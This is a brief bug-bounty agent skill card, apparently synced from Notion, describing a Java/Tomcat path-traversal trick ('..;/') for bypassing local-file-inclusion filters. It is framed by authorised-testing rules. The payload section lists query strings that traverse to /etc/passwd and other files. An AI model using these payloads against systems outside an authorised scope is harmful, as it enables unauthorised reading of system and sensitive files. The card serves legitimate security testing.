# SKILL: Java/Tomcat LFI filter bypass with ;/..;/..;/

**Skill id:** `tip/javatomcat-lfi-filter-bypass-with`  
**Category:** Recon, General  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/401dac31e8808100b0ccfa5dd00342de  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Recon, General**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

في Java web apps، كتير من الـ LFI filters بتتفوق بـ ;/..;/..;/ حيلة. جربها لما تلاقي include أو file parameter.

## Payload / Code

```
?include=..;/..;/..;/etc/passwd
?file=..;/..;/sensitive.txt
```

## Source

Book of BugBounty Tips (classic but still works)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
